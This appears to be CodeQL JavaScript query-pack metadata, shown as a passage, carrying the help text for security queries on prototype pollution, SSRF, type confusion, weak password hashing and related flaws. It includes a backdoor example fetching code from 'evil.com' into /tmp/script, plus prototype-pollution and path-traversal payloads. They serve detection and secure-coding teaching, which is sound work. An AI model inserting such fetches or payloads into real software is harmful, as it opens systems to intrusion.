    * Common Weakness Enumeration: [CWE-830](https://cwe.mitre.org/data/definitions/830.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-830/FunctionalityFromUntrustedSource.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-830/FunctionalityFromUntrustedSource.bqrs
  metadata:
    name: Inclusion of functionality from an untrusted source
    description: |-
      Including functionality from an untrusted source may allow
                    an attacker to control the functionality and execute arbitrary code.
    kind: problem
    problem.severity: warning
    security-severity: 6.0
    precision: high
    id: js/functionality-from-untrusted-source
    tags: |-
      security
             external/cwe/cwe-830
  queryHelp: |
    # Inclusion of functionality from an untrusted source
    Including a resource from an untrusted source or using an untrusted channel may allow an attacker to include arbitrary code in the response. When including an external resource (for example, a `script` element or an `iframe` element) on a page, it is important to ensure that the received data is not malicious.

    When including external resources, it is possible to verify that the responding server is the intended one by using an `https` URL. This prevents a MITM (man-in-the-middle) attack where an attacker might have been able to spoof a server response.

    Even when `https` is used, an attacker might still compromise the server. When you use a `script` element, you can check for subresource integrity - that is, you can check the contents of the data received by supplying a cryptographic digest of the expected sources to the `script` element. The script will only load sources that match the digest and an attacker will be unable to modify the script even when the server is compromised.

    Subresource integrity (SRI) checking is commonly recommended when importing a fixed version of a library - for example, from a CDN (content-delivery network). Then, the fixed digest of that version of the library can easily be added to the `script` element's `integrity` attribute.

    A dynamic service cannot be easily used with SRI. Nevertheless, it is possible to list multiple acceptable SHA hashes in the `integrity` attribute, such as those for the content generated for major browers used by your users.

    See the \[\`CUSTOMIZING.md\`\](https://github.com/github/codeql/blob/main/javascript/ql/src/Security/CWE-830/CUSTOMIZING.md) file in the source code for this query for information on how to extend the list of hostnames required to use SRI by this query.


    ## Recommendation
    When an `iframe` element is used to embed a page, it is important to use an `https` URL.

    When using a `script` element to load a script, it is important to use an `https` URL and to consider checking subresource integrity.


    ## Example
    The following example loads the jQuery library from the jQuery CDN without using `https` and without checking subresource integrity.


    ```html
    <html>
        <head>
            <title>jQuery demo</title>
            <script src="http://code.jquery.com/jquery-3.6.0.slim.min.js" crossorigin="anonymous"></script>
        </head>
        <body>
            ...
        </body>
    </html>
    ```
    Instead, loading jQuery from the same domain using `https` and checking subresource integrity is recommended, as in the next example.


    ```html
    <html>
        <head>
            <title>jQuery demo</title>
            <script src="https://code.jquery.com/jquery-3.6.0.slim.min.js" integrity="sha256-u7e5khyithlIdTpu22PHhENmPcRdFiHRjhAuHcs05RI=" crossorigin="anonymous"></script>
        </head>
        <body>
            ...
        </body>
    </html>
    ```

    ## References
    * MDN: [Subresource Integrity](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity)
    * Smashing Magazine: [Understanding Subresource Integrity](https://www.smashingmagazine.com/2019/04/understanding-subresource-integrity/)
    * Common Weakness Enumeration: [CWE-830](https://cwe.mitre.org/data/definitions/830.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-834/LoopBoundInjection.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-834/LoopBoundInjection.bqrs
  metadata:
    name: Loop bound injection
    description: |-
      Iterating over an object with a user-controlled .length
                    property can cause indefinite looping.
    kind: path-problem
    problem.severity: warning
    security-severity: 7.5
    id: js/loop-bound-injection
    tags: |-
      security
             external/cwe/cwe-834
             external/cwe/cwe-730
    precision: high
  queryHelp: "# Loop bound injection\nUsing the `.length` property of an untrusted\
    \ object as a loop bound may cause indefinite looping since a malicious attacker\
    \ can set the `.length` property to a very large number. For example, when a program\
    \ that expects an array is passed a JSON object such as `{length: 1e100}`, the\
    \ loop will be run for 10<sup>100</sup> iterations. This may cause the program\
    \ to hang or run out of memory, which can be used to mount a denial-of-service\
    \ (DoS) attack.\n\n\n## Recommendation\nEither check that the object is indeed\
    \ an array or limit the size of the `.length` property.\n\n\n## Example\nIn the\
    \ example below, an HTTP request handler iterates over a user-controlled object\
    \ `obj` using the `obj.length` property in order to copy the elements from `obj`\
    \ to an array.\n\n\n```javascript\nvar express = require('express');\nvar app\
    \ = express();\n\napp.post(\"/foo\", (req, res) => {\n    var obj = req.body;\n\
    \n    var ret = [];\n\n    // Potential DoS if obj.length is large.\n    for (var\
    \ i = 0; i < obj.length; i++) {\n        ret.push(obj[i]);\n    }\n});\n\n```\n\
    This is not secure since an attacker can control the value of `obj.length`, and\
    \ thereby cause the loop to iterate indefinitely. Here the potential DoS is fixed\
    \ by enforcing that the user-controlled object is an array.\n\n\n```javascript\n\
    var express = require('express');\nvar app = express();\n\napp.post(\"/foo\",\
    \ (req, res) => {\n    var obj = req.body;\n    \n    if (!(obj instanceof Array))\
    \ { // Prevents DoS.\n        return [];\n    }\n\n    var ret = [];\n\n    for\
    \ (var i = 0; i < obj.length; i++) {\n        ret.push(obj[i]);\n    }\n});\n\n\
    ```\n\n## References\n* Common Weakness Enumeration: [CWE-834](https://cwe.mitre.org/data/definitions/834.html).\n\
    * Common Weakness Enumeration: [CWE-730](https://cwe.mitre.org/data/definitions/730.html).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-843/TypeConfusionThroughParameterTampering.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-843/TypeConfusionThroughParameterTampering.bqrs
  metadata:
    name: Type confusion through parameter tampering
    description: Sanitizing an HTTP request parameter may be ineffective if the user
      controls its type.
    kind: path-problem
    problem.severity: error
    security-severity: 9.8
    precision: high
    id: js/type-confusion-through-parameter-tampering
    tags: |-
      security
             external/cwe/cwe-843
  queryHelp: |
    # Type confusion through parameter tampering
    Sanitizing untrusted HTTP request parameters is a common technique for preventing injection attacks such as SQL injection or path traversal. This is sometimes done by checking if the request parameters contain blacklisted substrings.

    However, sanitizing request parameters assuming they have type `String` and using the builtin string methods such as `String.prototype.indexOf` is susceptible to type confusion attacks. In a type confusion attack, an attacker tampers with an HTTP request parameter such that it has a value of type `Array` instead of the expected type `String`. Furthermore, the content of the array has been crafted to bypass sanitizers by exploiting that some identically named methods of strings and arrays behave differently.


    ## Recommendation
    Check the runtime type of sanitizer inputs if the input type is user-controlled.

    An even safer alternative is to design the application so that sanitization is not needed, for instance by using prepared statements for SQL queries.


    ## Example
    For example, Node.js server frameworks usually present request parameters as strings. But if an attacker sends multiple request parameters with the same name, then the request parameter is represented as an array instead.

    In the following example, a sanitizer checks that a path does not contain the `".."` string, which would allow an attacker to access content outside a user-accessible directory.


    ```javascript
    var app = require("express")(),
      path = require("path");

    app.get("/user-files", function(req, res) {
      var file = req.param("file");
      if (file.indexOf("..") !== -1) {
        // BAD
        // we forbid relative paths that contain ..
        // as these could leave the public directory
        res.status(400).send("Bad request");
      } else {
        var absolute = path.resolve("/public/" + file);
        console.log("Sending file: %s", absolute);
        res.sendFile(absolute);
      }
    });

    ```
    As written, this sanitizer is ineffective: an array like `["../", "/../secret.txt"]` will bypass the sanitizer. The array does not contain `".."` as an element, so the call to `indexOf` returns `-1` . This is problematic since the value of the `absolute` variable then ends up being `"/secret.txt"`. This happens since the concatenation of `"/public/"` and the array results in `"/public/../,/../secret.txt"`, which the `resolve`-call converts to `"/secret.txt"`.

    To fix the sanitizer, check that the request parameter is a string, and not an array:


    ```javascript
    var app = require("express")(),
      path = require("path");

    app.get("/user-files", function(req, res) {
      var file = req.param("file");
      if (typeof file !== 'string' || file.indexOf("..") !== -1) {
        // GOOD
        // we forbid relative paths that contain ..
        // as these could leave the public directory
        res.status(400).send("Bad request");
      } else {
        var absolute = path.resolve("/public/" + file);
        console.log("Sending file: %s", absolute);
        res.sendFile(absolute);
      }
    });

    ```

    ## References
    * Node.js API: [querystring](https://nodejs.org/api/querystring.html).
    * Common Weakness Enumeration: [CWE-843](https://cwe.mitre.org/data/definitions/843.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-862/EmptyPasswordInConfigurationFile.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-862/EmptyPasswordInConfigurationFile.bqrs
  metadata:
    name: Empty password in configuration file
    description: Failing to set a password reduces the security of your code.
    kind: problem
    problem.severity: warning
    security-severity: 7.5
    precision: medium
    id: js/empty-password-in-configuration-file
    tags: |-
      security
             external/cwe/cwe-258
             external/cwe/cwe-862
  queryHelp: |
    # Empty password in configuration file
    The use of an empty string as a password in a configuration file is not secure.


    ## Recommendation
    Choose a strong password and encrypt it if it has to be stored in a configuration file.


    ## References
    * Common Weakness Enumeration: [CWE-258](https://cwe.mitre.org/data/definitions/258.html).
    * Common Weakness Enumeration: [CWE-862](https://cwe.mitre.org/data/definitions/862.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-912/HttpToFileAccess.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-912/HttpToFileAccess.bqrs
  metadata:
    name: Network data written to file
    description: Writing network data directly to the file system allows arbitrary
      file upload and might indicate a backdoor.
    kind: path-problem
    problem.severity: warning
    security-severity: 6.3
    precision: medium
    id: js/http-to-file-access
    tags: |-
      security
             external/cwe/cwe-912
             external/cwe/cwe-434
  queryHelp: |
    # Network data written to file
    Storing user-controlled data on the local file system without further validation allows arbitrary file upload, and may be an indication of malicious backdoor code that has been implanted into an otherwise trusted code base.


    ## Recommendation
    Examine the highlighted code closely to ensure that it is behaving as intended.


    ## Example
    The following example shows backdoor code that downloads data from the URL `https://evil.com/script`, and stores it in the local file `/tmp/script`.


    ```javascript
    var https = require("https");
    var fs = require("fs");

    https.get('https://evil.com/script', res => {
      res.on("data", d => {
        fs.writeFileSync("/tmp/script", d)
      })
    });

    ```
    Other parts of the program might then assume that since `/tmp/script` is a local file its contents can be trusted, while in fact they are obtained from an untrusted remote source.


    ## References
    * OWASP: [Trojan Horse](https://www.owasp.org/index.php/Trojan_Horse).
    * OWASP: [Unrestricted File Upload](https://www.owasp.org/index.php/Unrestricted_File_Upload).
    * Common Weakness Enumeration: [CWE-912](https://cwe.mitre.org/data/definitions/912.html).
    * Common Weakness Enumeration: [CWE-434](https://cwe.mitre.org/data/definitions/434.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-915/PrototypePollutingAssignment.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-915/PrototypePollutingAssignment.bqrs
  metadata:
    name: Prototype-polluting assignment
    description: |-
      Modifying an object obtained via a user-controlled property name may
                    lead to accidental mutation of the built-in Object prototype,
                    and possibly escalate to remote code execution or cross-site scripting.
    kind: path-problem
    problem.severity: warning
    security-severity: 6.1
    precision: high
    id: js/prototype-polluting-assignment
    tags: |-
      security
             external/cwe/cwe-078
             external/cwe/cwe-079
             external/cwe/cwe-094
             external/cwe/cwe-400
             external/cwe/cwe-471
             external/cwe/cwe-915
  queryHelp: |
    # Prototype-polluting assignment
    Most JavaScript objects inherit the properties of the built-in `Object.prototype` object. Prototype pollution is a type of vulnerability in which an attacker is able to modify `Object.prototype`. Since most objects inherit from the compromised `Object.prototype` object, the attacker can use this to tamper with the application logic, and often escalate to remote code execution or cross-site scripting.

    One way to cause prototype pollution is by modifying an object obtained via a user-controlled property name. Most objects have a special `__proto__` property that refers to `Object.prototype`. An attacker can abuse this special property to trick the application into performing unintended modifications of `Object.prototype`.


    ## Recommendation
    Use an associative data structure that is resilient to untrusted key values, such as a [Map](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map). In some cases, a prototype-less object created with [Object.create(null)](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/create) may be preferable.

    Alternatively, restrict the computed property name so it can't clash with a built-in property, either by prefixing it with a constant string, or by rejecting inputs that don't conform to the expected format.


    ## Example
    In the example below, the untrusted value `req.params.id` is used as the property name `req.session.todos[id]`. If a malicious user passes in the ID value `__proto__`, the variable `items` will then refer to `Object.prototype`. Finally, the modification of `items` then allows the attacker to inject arbitrary properties onto `Object.prototype`.


    ```javascript
    let express = require('express');
    let app = express()

    app.put('/todos/:id', (req, res) => {
        let id = req.params.id;
        let items = req.session.todos[id];
        if (!items) {
            items = req.session.todos[id] = {};
        }
        items[req.query.name] = req.query.text;
        res.end(200);
    });

    ```
    One way to fix this is to use [Map](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map) objects to associate key/value pairs instead of regular objects, as shown below:


    ```javascript
    let express = require('express');
    let app = express()

    app.put('/todos/:id', (req, res) => {
        let id = req.params.id;
        let items = req.session.todos.get(id);
        if (!items) {
            items = new Map();
            req.sessions.todos.set(id, items);
        }
        items.set(req.query.name, req.query.text);
        res.end(200);
    });

    ```
    Another way to fix it is to prevent the `__proto__` property from being used as a key, as shown below:


    ```javascript
    let express = require('express');
    let app = express()

    app.put('/todos/:id', (req, res) => {
        let id = req.params.id;
        if (id === '__proto__' || id === 'constructor' || id === 'prototype') {
            res.end(403);
            return;
        }
        let items = req.session.todos[id];
        if (!items) {
            items = req.session.todos[id] = {};
        }
        items[req.query.name] = req.query.text;
        res.end(200);
    });

    ```

    ## References
    * MDN: [Object.prototype.__proto__](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/proto)
    * MDN: [Map](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map)
    * Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).
    * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).
    * Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).
    * Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).
    * Common Weakness Enumeration: [CWE-471](https://cwe.mitre.org/data/definitions/471.html).
    * Common Weakness Enumeration: [CWE-915](https://cwe.mitre.org/data/definitions/915.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-915/PrototypePollutingFunction.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-915/PrototypePollutingFunction.bqrs
  metadata:
    name: Prototype-polluting function
    description: |-
      Functions recursively assigning properties on objects may be
                    the cause of accidental modification of a built-in prototype object.
    kind: path-problem
    problem.severity: warning
    security-severity: 6.1
    precision: high
    id: js/prototype-pollution-utility
    tags: |-
      security
             external/cwe/cwe-078
             external/cwe/cwe-079
             external/cwe/cwe-094
             external/cwe/cwe-400
             external/cwe/cwe-471
             external/cwe/cwe-915
  queryHelp: |
    # Prototype-polluting function
    Most JavaScript objects inherit the properties of the built-in `Object.prototype` object. Prototype pollution is a type of vulnerability in which an attacker is able to modify `Object.prototype`. Since most objects inherit from the compromised `Object.prototype`, the attacker can use this to tamper with the application logic, and often escalate to remote code execution or cross-site scripting.

    One way to cause prototype pollution is through use of an unsafe *merge* or *extend* function to recursively copy properties from one object to another, or through the use of a *deep assignment* function to assign to an unverified chain of property names. Such a function has the potential to modify any object reachable from the destination object, and the built-in `Object.prototype` is usually reachable through the special properties `__proto__` and `constructor.prototype`.


    ## Recommendation
    The most effective place to guard against this is in the function that performs the recursive copy or deep assignment.

    Only merge or assign a property recursively when it is an own property of the *destination* object. Alternatively, block the property names `__proto__` and `constructor` from being merged or assigned to.


    ## Example
    This function recursively copies properties from `src` to `dst`:


    ```javascript
    function merge(dst, src) {
        for (let key in src) {
            if (!src.hasOwnProperty(key)) continue;
            if (isObject(dst[key])) {
                merge(dst[key], src[key]);
            } else {
                dst[key] = src[key];
            }
        }
    }

    ```
    However, if `src` is the object `{"__proto__": {"isAdmin": true}}`, it will inject the property `isAdmin: true` in `Object.prototype`.

    The issue can be fixed by ensuring that only own properties of the destination object are merged recursively:


    ```javascript
    function merge(dst, src) {
        for (let key in src) {
            if (!src.hasOwnProperty(key)) continue;
            if (dst.hasOwnProperty(key) && isObject(dst[key])) {
                merge(dst[key], src[key]);
            } else {
                dst[key] = src[key];
            }
        }
    }

    ```
    Alternatively, block the `__proto__` and `constructor` properties:


    ```javascript
    function merge(dst, src) {
        for (let key in src) {
            if (!src.hasOwnProperty(key)) continue;
            if (key === "__proto__" || key === "constructor") continue;
            if (isObject(dst[key])) {
                merge(dst[key], src[key]);
            } else {
                dst[key] = src[key];
            }
        }
    }

    ```

    ## References
    * Prototype pollution attacks: [lodash](https://hackerone.com/reports/380873), [jQuery](https://hackerone.com/reports/454365), [extend](https://hackerone.com/reports/381185), [just-extend](https://hackerone.com/reports/430291), [merge.recursive](https://hackerone.com/reports/381194).
    * Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).
    * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).
    * Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).
    * Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).
    * Common Weakness Enumeration: [CWE-471](https://cwe.mitre.org/data/definitions/471.html).
    * Common Weakness Enumeration: [CWE-915](https://cwe.mitre.org/data/definitions/915.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-915/PrototypePollutingMergeCall.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-915/PrototypePollutingMergeCall.bqrs
  metadata:
    name: Prototype-polluting merge call
    description: |-
      Recursively merging a user-controlled object into another object
                    can allow an attacker to modify the built-in Object prototype,
                    and possibly escalate to remote code execution or cross-site scripting.
    kind: path-problem
    problem.severity: error
    security-severity: 6.1
    precision: high
    id: js/prototype-pollution
    tags: |-
      security
             external/cwe/cwe-078
             external/cwe/cwe-079
             external/cwe/cwe-094
             external/cwe/cwe-400
             external/cwe/cwe-471
             external/cwe/cwe-915
  queryHelp: |
    # Prototype-polluting merge call
    Most JavaScript objects inherit the properties of the built-in `Object.prototype` object. Prototype pollution is a type of vulnerability in which an attacker is able to modify `Object.prototype`. Since most objects inherit from the compromised `Object.prototype`, the attacker can use this to tamper with the application logic, and often escalate to remote code execution or cross-site scripting.

    One way to cause prototype pollution is through use of an unsafe *merge* or *extend* function to recursively copy properties from an untrusted source object. Such a call can modify any object reachable from the destination object, and the built-in `Object.prototype` is usually reachable through the special properties `__proto__` and `constructor.prototype`. An attacker can abuse this by sending an object with these property names and thereby modify `Object.prototype`.


    ## Recommendation
    Update your library dependencies in order to use a safe version of the *merge* or *extend* function. If your library has no fixed version, switch to another library.


    ## Example
    In the example below, the untrusted value `req.query.prefs` is parsed as JSON and then copied into a new object:


    ```javascript
    app.get('/news', (req, res) => {
      let prefs = lodash.merge({}, JSON.parse(req.query.prefs));
    })

    ```
    Prior to lodash 4.17.11 this would be vulnerable to prototype pollution. An attacker could send the following GET request:

    ```
    GET /news?prefs={"constructor":{"prototype":{"xxx":true}}}
    ```
    This causes the `xxx` property to be injected on `Object.prototype`. Fix this by updating the lodash version:


    ```json
    {
      "dependencies": {
        "lodash": "^4.17.12"
      }
    }

    ```
    Note that some web frameworks, such as Express, parse query parameters using extended URL-encoding by default. When this is the case, the application may be vulnerable even if not using `JSON.parse`. The example below would also be susceptible to prototype pollution:


    ```javascript
    app.get('/news', (req, res) => {
      let config = lodash.merge({}, {
        prefs: req.query.prefs
      });
    })

    ```
    In the above example, an attacker can cause prototype pollution by sending the following GET request:

    ```
    GET /news?prefs[constructor][prototype][xxx]=true
    ```

    ## References
    * Prototype pollution attacks: [lodash](https://hackerone.com/reports/380873), [jQuery](https://hackerone.com/reports/454365), [extend](https://hackerone.com/reports/381185), [just-extend](https://hackerone.com/reports/430291), [merge.recursive](https://hackerone.com/reports/381194).
    * Express: [urlencoded()](https://expressjs.com/en/api.html#express.urlencoded)
    * Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).
    * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).
    * Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).
    * Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).
    * Common Weakness Enumeration: [CWE-471](https://cwe.mitre.org/data/definitions/471.html).
    * Common Weakness Enumeration: [CWE-915](https://cwe.mitre.org/data/definitions/915.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-916/InsufficientPasswordHash.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-916/InsufficientPasswordHash.bqrs
  metadata:
    name: Use of password hash with insufficient computational effort
    description: Creating a hash of a password with low computational effort makes
      the hash vulnerable to password cracking attacks.
    kind: path-problem
    problem.severity: warning
    security-severity: 8.1
    precision: high
    id: js/insufficient-password-hash
    tags: |-
      security
             external/cwe/cwe-916
  queryHelp: |
    # Use of password hash with insufficient computational effort
    Storing cryptographic hashes of passwords is standard security practice, but it is equally important to select the right hashing scheme. If an attacker obtains the hashed passwords of an application, the password hashing scheme should still prevent the attacker from easily obtaining the original cleartext passwords.

    A good password hashing scheme requires a computation that cannot be done efficiently. Standard hashing schemes, such as `md5` or `sha1`, are efficiently computable, and are therefore not suitable for password hashing.


    ## Recommendation
    Use a secure password hashing scheme such as `bcrypt`, `scrypt`, `PBKDF2`, or `Argon2`.


    ## Example
    In the example below, the `md5` algorithm computes the hash of a password.


    ```javascript
    const crypto = require("crypto");
    function hashPassword(password) {
        var hasher = crypto.createHash('md5');
        var hashed = hasher.update(password).digest("hex"); // BAD
        return hashed;
    }

    ```
    This is not secure, since the password can be efficiently cracked by an attacker that obtains the hash. A more secure scheme is to hash the password with the `bcrypt` algorithm:


    ```javascript
    const bcrypt = require("bcrypt");
    function hashPassword(password, salt) {
      var hashed = bcrypt.hashSync(password, salt); // GOOD
      return hashed;
    }

    ```

    ## References
    * OWASP: [Password storage](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html).
    * Common Weakness Enumeration: [CWE-916](https://cwe.mitre.org/data/definitions/916.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-918/ClientSideRequestForgery.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-918/ClientSideRequestForgery.bqrs
  metadata:
    name: Client-side request forgery
    description: |-
      Making a client-to-server request with user-controlled data in the URL allows a request forgery attack
                    against the client.
    kind: path-problem
    problem.severity: error
    security-severity: 5.0
    precision: medium
    id: js/client-side-request-forgery
    tags: |-
      security
             external/cwe/cwe-918
  queryHelp: |
    # Client-side request forgery
    Directly incorporating user input in the URL of an outgoing HTTP request can enable a request forgery attack, in which the request is altered to target an unintended API endpoint or resource. A client-side forged request may perform an unwanted action affecting the victim's account, or may lead to cross-site scripting if the request response is handled in an unsafe way. This is different from CSRF (cross-site request forgery), and will usually bypass CSRF protections. This is usually less severe than SSRF (server-side request forgery), as it does not expose internal services.


    ## Recommendation
    Restrict user inputs in the URL of an outgoing request, in particular:

    * Avoid user input in the hostname of the URL. Pick the hostname from an allow-list instead of constructing it directly from user input.
    * Take care when user input is part of the pathname of the URL. Restrict the input so that path traversal ("`../`") cannot be used to redirect the request to an unintended endpoint.

    ## Example
    The following example shows an HTTP request used to fetch the pre-rendered HTML body of a message. It is using the endpoint `/api/messages/ID`, which is believed to respond with a safe HTML string, to be embedded in the page:


    ```javascript
    async function loadMessage() {
        const query = new URLSearchParams(location.search);
        const url = '/api/messages/' + query.get('message_id');
        const data = await (await fetch(url)).json();
        document.getElementById('message').innerHTML = data.html;
    }

    ```
    However, the format of the message ID is not checked, and an attacker can abuse this to alter the endpoint targeted by the request. If they can redirect it to an endpoint that returns an untrusted value, this leads to cross-site scripting.

    For example, given the query string `message_id=../pastebin/123`, the request will end up targeting the `/api/pastebin` endpoint. Or if there is an open redirect on the login page, a query string like `message_id=../../login?redirect_url=https://evil.com` could give the attacker full control over the response as well.

    In example below, the input has been restricted to a number so that the endpoint cannot be altered:


    ```javascript
    async function loadMessage() {
        const query = new URLSearchParams(location.search);
        const url = '/api/messages/' + Number(query.get('message_id'));
        const data = await (await fetch(url)).json();
        document.getElementById('message').innerHTML = data.html;
    }

    ```

    ## References
    * OWASP: [Server-side request forgery](https://cwe.mitre.org/data/definitions/918.html)
    * OWASP: [Cross-site request forgery](https://cwe.mitre.org/data/definitions/352.html)
    * Common Weakness Enumeration: [CWE-918](https://cwe.mitre.org/data/definitions/918.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-918/RequestForgery.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-918/RequestForgery.bqrs
  metadata:
    name: Server-side request forgery
    description: Making a network request with user-controlled data in the URL allows
      for request forgery attacks.
    kind: path-problem
    problem.severity: error
    security-severity: 9.1
    precision: high
    id: js/request-forgery
    tags: |-
      security
             external/cwe/cwe-918
  queryHelp: |
    # Server-side request forgery
    Directly incorporating user input in the URL of an outgoing HTTP request can enable a request forgery attack, in which the request is altered to target an unintended API endpoint or resource. If the server performing the request is connected to an internal network, this can give an attacker the means to bypass the network boundary and make requests against internal services. A forged request may perform an unintended action on behalf of the attacker, or cause information leak if redirected to an external server or if the request response is fed back to the user. It may also compromise the server making the request, if the request response is handled in an unsafe way.


    ## Recommendation
    Restrict user inputs in the URL of an outgoing request, in particular:

    * Avoid user input in the hostname of the URL. Pick the hostname from an allow-list instead of constructing it directly from user input.
    * Take care when user input is part of the pathname of the URL. Restrict the input so that path traversal ("`../`") cannot be used to redirect the request to an unintended endpoint.

    ## Example
    The following example shows an HTTP request parameter being used directly in the URL of a request without validating the input, which facilitates an SSRF attack. The request `http.get(...)` is vulnerable since attackers can choose the value of `target` to be anything they want. For instance, the attacker can choose `"internal.example.com/#"` as the target, causing the URL used in the request to be `"https://internal.example.com/#.example.com/data"`.

    A request to `https://internal.example.com` may be problematic if that server is not meant to be directly accessible from the attacker's machine.


    ```javascript
    import http from 'http';

    const server = http.createServer(function(req, res) {
        const target = new URL(req.url, "http://example.com").searchParams.get("target");

        // BAD: `target` is controlled by the attacker
        http.get('https://' + target + ".example.com/data/", res => {
            // process request response ...
        });

    });

    ```
    One way to remedy the problem is to use the user input to select a known fixed string before performing the request:


    ```javascript
    import http from 'http';

    const server = http.createServer(function(req, res) {
        const target = new URL(req.url, "http://example.com").searchParams.get("target");

        let subdomain;
        if (target === 'EU') {
            subdomain = "europe"
        } else {
            subdomain = "world"
        }

        // GOOD: `subdomain` is controlled by the server
        http.get('https://' + subdomain + ".example.com/data/", res => {
            // process request response ...
        });

    });

    ```

    ## References
    * OWASP: [SSRF](https://www.owasp.org/index.php/Server_Side_Request_Forgery)
    * Common Weakness Enumeration: [CWE-918](https://cwe.mitre.org/data/definitions/918.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Summary/LinesOfCode.ql
  relativeBqrsPath: codeql/javascript-queries/Summary/LinesOfCode.bqrs
  metadata:
    id: js/summary/lines-of-code
    name: Total lines of JavaScript and TypeScript code in the database
    description: "The total number of lines of JavaScript or TypeScript code across\
      \ all files checked into the repository, except in `node_modules`. This is a\
      \ useful metric of the size of a database. For all files that were seen during\
      \ extraction, this query counts the lines of code, excluding whitespace or comments."
    kind: metric
    tags: |-
      summary
             telemetry
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Summary/LinesOfUserCode.ql
  relativeBqrsPath: codeql/javascript-queries/Summary/LinesOfUserCode.bqrs
  metadata:
    name: Total lines of user written JavaScript and TypeScript code in the database
    description: |-
      The total number of lines of JavaScript and TypeScript code from the source code directory,
         excluding auto-generated files and files in `node_modules`. This query counts the lines of code, excluding
         whitespace or comments.
    kind: metric
    tags: |-
      summary
             lines-of-code
             debug
    id: js/summary/lines-of-user-code
extensionPacks: []
packs:
  codeql/threat-models#2:
    name: codeql/threat-models
    version: 1.0.30
    isLibrary: true
    isExtensionPack: false
    localPath: file:///Users/yevhen.fabizhevskyi/.local/bin/codeql/qlpacks/codeql/javascript-queries/2.0.3/.codeql/libraries/codeql/threat-models/1.0.30/
    localPackDefinitionFile: file:///Users/yevhen.fabizhevskyi/.local/bin/codeql/qlpacks/codeql/javascript-queries/2.0.3/.codeql/libraries/codeql/threat-models/1.0.30/qlpack.yml
    headSha: 28f02c07d7d744d761520fbfb354f96827a11f6c
    runDataExtensions: []
  codeql/javascript-all#1:
    name: codeql/javascript-all
    version: 2.6.10
    isLibrary: true
    isExtensionPack: false
    localPath: file:///Users/yevhen.fabizhevskyi/.local/bin/codeql/qlpacks/codeql/javascript-queries/2.0.3/.codeql/libraries/codeql/javascript-all/2.6.10/
    localPackDefinitionFile: file:///Users/yevhen.fabizhevskyi/.local/bin/codeql/qlpacks/codeql/javascript-queries/2.0.3/.codeql/libraries/codeql/javascript-all/2.6.10/qlpack.yml
    headSha: 28f02c07d7d744d761520fbfb354f96827a11f6c
    runDataExtensions: []
  codeql/util#3:
    name: codeql/util
    version: 2.0.17
    isLibrary: true
    isExtensionPack: false
    localPath: file:///Users/yevhen.fabizhevskyi/.local/bin/codeql/qlpacks/codeql/javascript-queries/2.0.3/.codeql/libraries/codeql/util/2.0.17/
    localPackDefinitionFile: file:///Users/yevhen.fabizhevskyi/.local/bin/codeql/qlpacks/codeql/javascript-queries/2.0.3/.codeql/libraries/codeql/util/2.0.17/qlpack.yml
    headSha: 28f02c07d7d744d761520fbfb354f96827a11f6c
    runDataExtensions: []
  codeql/javascript-queries#0:
    name: codeql/javascript-queries
    version: 2.0.3
    isLibrary: false
    isExtensionPack: false
    localPath: file:///Users/yevhen.fabizhevskyi/.local/bin/codeql/qlpacks/codeql/javascript-queries/2.0.3/
    localPackDefinitionFile: file:///Users/yevhen.fabizhevskyi/.local/bin/codeql/qlpacks/codeql/javascript-queries/2.0.3/qlpack.yml
    headSha: 28f02c07d7d744d761520fbfb354f96827a11f6c
    runDataExtensions:
     -
      pack: codeql/javascript-all#1
      relativePath: ext/apollo-server.model.yml
      index: 0
      firstRowId: 0
      rowCount: 1
      locations:
        lineNumbers: A=6
        columnNumbers: A=9
     -
      pack: codeql/javascript-all#1
